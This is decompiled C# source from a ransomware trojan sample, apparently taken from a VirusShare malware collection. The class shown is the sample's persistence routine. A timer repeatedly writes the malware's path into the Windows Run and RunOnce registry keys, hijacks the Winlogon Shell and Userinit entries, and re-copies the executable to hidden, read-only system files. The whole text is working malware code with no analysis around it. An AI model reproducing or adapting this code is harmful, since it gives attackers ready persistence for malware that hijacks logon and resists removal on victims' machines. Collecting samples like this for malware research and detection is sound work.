// Decompiled with JetBrains decompiler
// Type: _2012.x0_per
// Assembly: 2012, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: F5694FB0-D176-4C80-83D0-71B8F6A2BF06
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00050-msil\Trojan-Ransom.Win32.Blocker.cmxi-ac38440cdaaa0a8f08255d957aa7b8a4bfc2438b.exe

using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Timers;

namespace _2012
{
  internal class x0_per
  {
    private static Timer chktimer = new Timer();
    private static string xselfp = Process.GetCurrentProcess().MainModule.FileName;

    public static void cargape()
    {
      x0_per.chktimer.Interval = 450000.0;
      x0_per.chktimer.Elapsed += new ElapsedEventHandler(x0_per.chkpro);
      x0_per.chktimer.Start();
    }

    public static void stopPersistent()
    {
      x0_per.chktimer.Stop();
      x0_per.chktimer.Dispose();
    }

    private static void chkpro(object source, ElapsedEventArgs eArgs)
    {
      if (x0_fnc.fnc_admin())
      {
        try
        {
          RegistryKey registryKey1 = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
          if (registryKey1.Equals((object) x0_ins.registro[0]))
          {
            if (registryKey1.GetValue(x0_ins.registro[0]).ToString() != '"'.ToString() + x0_ins.paths[0] + (object) '"')
              registryKey1.SetValue(x0_ins.registro[0], (object) ('"'.ToString() + x0_ins.paths[0] + (object) '"'));
          }
          else
            registryKey1.SetValue(x0_ins.registro[0], (object) ('"'.ToString() + x0_ins.paths[0] + (object) '"'));
          if (registryKey1.Equals((object) x0_ins.registro[1]))
          {
            if (registryKey1.GetValue(x0_ins.registro[1]).ToString() != '"'.ToString() + x0_ins.paths[1] + (object) '"')
              registryKey1.SetValue(x0_ins.registro[1], (object) ('"'.ToString() + x0_ins.paths[1] + (object) '"'));
          }
          else
            registryKey1.SetValue(x0_ins.registro[1], (object) ('"'.ToString() + x0_ins.paths[1] + (object) '"'));
          RegistryKey registryKey2 = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run", true);
          if (registryKey2.Equals((object) x0_ins.registro[0]))
          {
            if (registryKey2.GetValue(x0_ins.registro[0]).ToString() != '"'.ToString() + x0_ins.paths[0] + (object) '"')
              registryKey2.SetValue(x0_ins.registro[0], (object) ('"'.ToString() + x0_ins.paths[0] + (object) '"'));
          }
          else
            registryKey2.SetValue(x0_ins.registro[0], (object) ('"'.ToString() + x0_ins.paths[0] + (object) '"'));
          if (registryKey2.Equals((object) x0_ins.registro[1]))
          {
            if (registryKey2.GetValue(x0_ins.registro[1]).ToString() != '"'.ToString() + x0_ins.paths[1] + (object) '"')
              registryKey2.SetValue(x0_ins.registro[1], (object) ('"'.ToString() + x0_ins.paths[1] + (object) '"'));
          }
          else
            registryKey2.SetValue(x0_ins.registro[1], (object) ('"'.ToString() + x0_ins.paths[1] + (object) '"'));
          RegistryKey registryKey3 = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", true);
          if (registryKey3.Equals((object) x0_ins.registro[0]))
          {
            if (registryKey3.GetValue(x0_ins.registro[0]).ToString() != '"'.ToString() + x0_ins.paths[0] + (object) '"')
              registryKey3.SetValue(x0_ins.registro[0], (object) ('"'.ToString() + x0_ins.paths[0] + (object) '"'));
          }
          else
            registryKey3.SetValue(x0_ins.registro[0], (object) ('"'.ToString() + x0_ins.paths[0] + (object) '"'));
          if (registryKey3.Equals((object) x0_ins.registro[1]))
          {
            if (registryKey3.GetValue(x0_ins.registro[1]).ToString() != '"'.ToString() + x0_ins.paths[1] + (object) '"')
              registryKey3.SetValue(x0_ins.registro[1], (object) ('"'.ToString() + x0_ins.paths[1] + (object) '"'));
          }
          else
            registryKey3.SetValue(x0_ins.registro[1], (object) ('"'.ToString() + x0_ins.paths[1] + (object) '"'));
          RegistryKey registryKey4 = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", true);
          if (registryKey4.Equals((object) "Shell"))
          {
            if (registryKey4.GetValue("Shell").ToString() != "Explorer.exe \"" + x0_ins.paths[0] + "\"")
              registryKey4.SetValue("Shell", (object) ("Explorer.exe \"" + x0_ins.paths[0] + "\""));
          }
          else
            registryKey4.SetValue("Shell", (object) ("Explorer.exe \"" + x0_ins.paths[0] + "\""));
          if (registryKey4.Equals((object) "Userinit"))
          {
            if (registryKey4.GetValue("Userinit").ToString() != "userinit.exe \"" + x0_ins.paths[0] + "\"")
              registryKey4.SetValue("Userinit", (object) ("userinit.exe \"" + x0_ins.paths[0] + "\""));
          }
          else
            registryKey4.SetValue("Userinit", (object) ("userinit.exe \"" + x0_ins.paths[0] + "\""));
        }
        catch (Exception ex)
        {
          Console.WriteLine((object) ex);
        }
      }
      else
      {
        try
        {
          RegistryKey registryKey5 = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
          if (registryKey5.Equals((object) x0_ins.registro[0]))
          {
            if (registryKey5.GetValue(x0_ins.registro[0]).ToString() != '"'.ToString() + x0_ins.paths[0] + (object) '"')
              registryKey5.SetValue(x0_ins.registro[0], (object) ('"'.ToString() + x0_ins.paths[0] + (object) '"'));
          }
          else
            registryKey5.SetValue(x0_ins.registro[0], (object) ('"'.ToString() + x0_ins.paths[0] + (object) '"'));
          if (registryKey5.Equals((object) x0_ins.registro[1]))
          {
            if (registryKey5.GetValue(x0_ins.registro[1]).ToString() != '"'.ToString() + x0_ins.paths[1] + (object) '"')
              registryKey5.SetValue(x0_ins.registro[1], (object) ('"'.ToString() + x0_ins.paths[1] + (object) '"'));
          }
          else
            registryKey5.SetValue(x0_ins.registro[1], (object) ('"'.ToString() + x0_ins.paths[1] + (object) '"'));
          RegistryKey registryKey6 = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run", true);
          if (registryKey6.Equals((object) x0_ins.registro[0]))
          {
            if (registryKey6.GetValue(x0_ins.registro[0]).ToString() != '"'.ToString() + x0_ins.paths[0] + (object) '"')
              registryKey6.SetValue(x0_ins.registro[0], (object) ('"'.ToString() + x0_ins.paths[0] + (object) '"'));
          }
          else
            registryKey6.SetValue(x0_ins.registro[0], (object) ('"'.ToString() + x0_ins.paths[0] + (object) '"'));
          if (registryKey6.Equals((object) x0_ins.registro[1]))
          {
            if (registryKey6.GetValue(x0_ins.registro[1]).ToString() != '"'.ToString() + x0_ins.paths[1] + (object) '"')
              registryKey6.SetValue(x0_ins.registro[1], (object) ('"'.ToString() + x0_ins.paths[1] + (object) '"'));
          }
          else
            registryKey6.SetValue(x0_ins.registro[1], (object) ('"'.ToString() + x0_ins.paths[1] + (object) '"'));
          RegistryKey registryKey7 = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", true);
          if (registryKey7.Equals((object) x0_ins.registro[0]))
          {
            if (registryKey7.GetValue(x0_ins.registro[0]).ToString() != '"'.ToString() + x0_ins.paths[0] + (object) '"')
              registryKey7.SetValue(x0_ins.registro[0], (object) ('"'.ToString() + x0_ins.paths[0] + (object) '"'));
          }
          else
            registryKey7.SetValue(x0_ins.registro[0], (object) ('"'.ToString() + x0_ins.paths[0] + (object) '"'));
          if (registryKey7.Equals((object) x0_ins.registro[1]))
          {
            if (registryKey7.GetValue(x0_ins.registro[1]).ToString() != '"'.ToString() + x0_ins.paths[1] + (object) '"')
              registryKey7.SetValue(x0_ins.registro[1], (object) ('"'.ToString() + x0_ins.paths[1] + (object) '"'));
          }
          else
            registryKey7.SetValue(x0_ins.registro[1], (object) ('"'.ToString() + x0_ins.paths[1] + (object) '"'));
        }
        catch (Exception ex)
        {
          Console.WriteLine((object) ex);
        }
      }
      try
      {
        foreach (string path in x0_ins.paths)
        {
          if (!x0_fnc.checkFile(path))
          {
            File.SetAttributes(path, File.GetAttributes(path) | FileAttributes.Normal);
            File.Copy(x0_per.xselfp, path, true);
            File.SetAttributes(path, File.GetAttributes(path) | FileAttributes.System | FileAttributes.Hidden | FileAttributes.ReadOnly | FileAttributes.NotContentIndexed);
          }
        }
      }
      catch (Exception ex)
      {
        Console.WriteLine((object) ex);
      }
    }
  }
}
